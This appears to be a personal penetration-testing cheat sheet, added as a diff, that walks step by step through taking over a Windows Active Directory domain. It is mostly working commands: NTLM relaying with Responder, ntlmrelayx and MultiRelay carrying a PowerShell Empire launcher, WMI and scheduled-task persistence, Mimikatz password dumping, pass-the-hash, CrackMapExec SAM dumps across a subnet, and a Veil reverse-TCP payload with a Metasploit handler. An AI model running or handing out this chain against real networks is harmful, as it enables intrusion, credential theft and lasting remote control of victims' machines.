@@ -1,0 +1,96 @@
+1. Go to /usr/share/responder/Responder.conf and set the following values to Off:
+
+HTTP Off
+SMB Off
+
+2. responder -I eth0 -rv
+
+3. in powershell empire, enter the following commands
+> listeners
+> uselistener http
+> info
+> set Host ip_address
+> set Port port_number
+> execute
+> launcher powershell		======> copy the output of this command
+> usestager multi/launcher
+> set Listener http
+> Generate
+> copy and paste into ntlmrelayx.py below
+
+4. ntlmrelayx.py -tf "filename with targets" -c 'output of previous generate command'
+
+ALTERNATIVE - only targets one machine, if you want to use multirelay then go to folder
+/usr/share/responder/tools/MultiRelay
+
+./MultiRelay.py -t "target-ip-address" -u ALL	===> multirelay is only for single targets
+
+5. Once you get a shell from multierelay or ntlmrelayx, run the powershell empire payload directly through the existing connection if it wasnt already run (the one you generated in step 3) and await for the agent on powershell empire to become available
+
+Once a connection back is received, change to agents
+> agents
+> interact [agentID]
+
+To add persistence 
+> usemodule persistence/elevated/wmi      --> very damn persistent 
+
+6. For grabbing the passwords
+> usemodule powershell/credentials/mimikatz/command
+> set command sekurlsa::logonpasswords
+> execute
+got cleartext password of domain admin (or if any other user, continue with step 7)
+
+For accessing remote machines with pass-the-hash
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:15c25ac2cccccccccccccccc575f3c39 //10.x.x.1 cmd
+
+7. Running crackmapexec with the domain creds to see which machines we can access to out of curiousity
+crackmapexec smb -u username -p password -d domain_name 10.0.0.0/24 -M mimikatz
+
+7.a If you dont have domain admin, or only have service access or whatever different user, try the following:
+crackmapexec -u username-p password -d domain_name -t 100 ip_address --sam
+s
+8. You should have domain admin, log on to the DC either through remote desktop, or use the following command
+impacket-wmiexec integdom/domainadmin:password@IP_address
+
+
+
+
+
+ALTERNATIVE persistence
+Once you have access to the target machine, upload the veil payload to the target, and create a scheduled task to have it run and keep on giving you a reverse connection for persistence.
+
+To create a scheduled task for persistence on target machine, two options:
+schtasks /create /tn test /tr C:\Windows\system32\runme.bat /sc HOURLY
+schtasks /create /tn "test1" /tr "\"C:\Windows\system32\runme.bat"" /sc DAILY /st 07:00 /f /RI 60 /du 96:00
+Persistence: For Veil, create a reverse TCP
+./Veil.py
+> use 1
+> use 22
+> Set LHOST ip_address
+> Set LPORT port_used
+> generate
+
+(/usr/share/veil-output/source)
+
+
+Then on meterpreter:
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+info
+and set lhost and lport
+set exitonsession false
+execute -j
+
+
+
+Nice URLs to read
+https://github.com/byt3bl33d3r/CrackMapExec.git
+https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+https://chryzsh.gitbooks.io/darthsidious/content/relay.html
+http://g-laurent.blogspot.co.uk/2016/10/introducing-responder-multirelay-10.html
+
+
+
+
+ 
